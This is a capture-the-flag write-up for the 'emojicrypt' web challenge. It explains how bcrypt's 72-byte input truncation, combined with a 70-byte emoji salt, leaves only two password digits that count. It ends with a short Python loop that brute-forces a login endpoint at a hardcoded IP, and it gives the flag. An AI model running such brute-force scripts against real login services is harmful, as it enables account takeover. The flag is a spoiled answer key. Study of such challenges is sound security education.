# squ1rrel CTF 2025

## emojicrypt

> Passwords can be more secure. We’re taking the first step.
>
>  Author: nisala
>
> [`index.html`](index.html), [`app.py`](app.py)

Tags: _web_

## Solution
The challenge comes with a small web application. We can register users or login with the credentials of a given user. Let's check the routes.

```py
@app.route('/register', methods=['POST'])
def register():
    email = request.form.get('email')
    username = request.form.get('username')

    if not email or not username:
        return "Missing email or username", 400
    salt = generate_salt()
    random_password = ''.join(random.choice(NUMBERS) for _ in range(32))
    password_hash = bcrypt.hashpw((salt + random_password).encode("utf-8"), bcrypt.gensalt()).decode('utf-8')

    # TODO: email the password to the user. oopsies!

    db = get_db()
    cursor = db.cursor()
    try:
        cursor.execute("INSERT INTO users (email, username, password_hash, salt) VALUES (?, ?, ?, ?)", (email, username, password_hash, salt))
        db.commit()
    except sqlite3.IntegrityError as e:
        print(e)
        return "Email or username already exists", 400

    return redirect(url_for('index', registered='true'))
```

The function takes username and email and automatically creates a password. The password is a string of 32 randomly choosed numers from 0-9. Like every good web application a hash is stored in the database rather than the password in plaintext. For this the application uses [`bcrypt`](https://github.com/pyca/bcrypt/) (maybe?). Anyways, the program *forgets* to give the user the password after login.

How should we login then? The login route looks also fairly ok. We can't bruteforce the password... 

```py
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return "Missing username or password", 400
    
    db = get_db()
    cursor = db.cursor()
    cursor.execute("SELECT salt, password_hash FROM users WHERE username = ?", (username,))
    data = cursor.fetchone()
    if data is None:
        return redirect(url_for('index', incorrect='true'))
    
    salt, hash = data
    
    if salt and hash and bcrypt.checkpw((salt + password).encode("utf-8"), hash.encode("utf-8")):
        return os.environ.get("FLAG")
    else:
        return redirect(url_for('index', incorrect='true'))
```

But the application shines by using a salt for the password, that is generated from a set of emoticons.

```py
EMOJIS = ['🌀', '🌁', '🌂', '🌐', '🌱', '🍀', '🍁', '🍂', '🍄', '🍅', '🎁', '🎒', '🎓', '🎵', '😀', '😁', '😂', '😕', '😶', '😩', '😗']
def generate_salt():
    return 'aa'.join(random.choices(EMOJIS, k=12))
```

This creates funny looking salts for the password. 

```py
>>> generate_salt()
'🎁aa🌱aa🍁aa🌁aa🌀aa😁aa🎁aa😂aa🍀aa😩aa🍄aa🌁'
>>> generate_salt()
'🌂aa😁aa🌐aa😗aa🎵aa🎁aa🌁aa🌐aa🍀aa😂aa😗aa🌂'
```

The salts are `12*3-2 = 34` characters long, but since it uses emojicons the codepages are rather large so not every character uses 8 bit only. This is so wasteful... But whatever improves security, right?

```py
>>> len(generate_salt().encode())
70
```

Interestingly, if we check the implementation of [`hashpw`](https://github.com/pyca/bcrypt/blob/9e5a7c5ae433bdd60a7fb35c66d66e69156fffdf/src/_bcrypt/src/lib.rs#L81) we find this:

```rs
// bcrypt originally suffered from a wraparound bug:
// http://www.openwall.com/lists/oss-security/2012/01/02/4
// This bug was corrected in the OpenBSD source by truncating inputs to 72
// bytes on the updated prefix $2b$, but leaving $2a$ unchanged for
// compatibility. However, pyca/bcrypt 2.0.0 *did* correctly truncate inputs
// on $2a$, so we do it here to preserve compatibility with 2.0.0
let password = &password[..password.len().min(72)];
```

The algorithm truncates passwords to a length of maximum 72 bytes. That is bad news, as our salt is already 70 bytes long, so most of the 32 numbers of our password are just thrown away, to be exact only the first two numbers are considered.

This of course is a wonderful search space for bruteforce. Bruteforcing the range `00` to `99` gives us eventually the flag.

```py
import requests

for i in range(100):
    resp = requests.post("http://52.188.82.43:8060/login", {"username":"test", "password":f"{i:02d}"})
    if "Password incorrect" not in resp.text:
        print(resp.text)
        exit()
```

Flag `squ1rrel{turns_out_the_emojis_werent_that_useful_after_all}`